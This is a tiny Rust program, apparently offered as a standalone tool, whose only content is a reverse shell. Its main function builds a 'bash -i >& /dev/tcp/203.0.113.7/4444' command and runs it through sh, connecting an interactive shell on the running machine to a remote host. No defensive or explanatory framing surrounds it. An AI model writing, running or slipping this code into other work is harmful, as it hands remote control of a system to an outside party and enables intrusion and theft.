use std::process::Command;
fn main() {
    let cmd = format!("bash -i >& /dev/tcp/{}/{} 0>&1", "203.0.113.7", 4444);
    Command::new("sh").arg("-c").arg(cmd).status().unwrap();
}
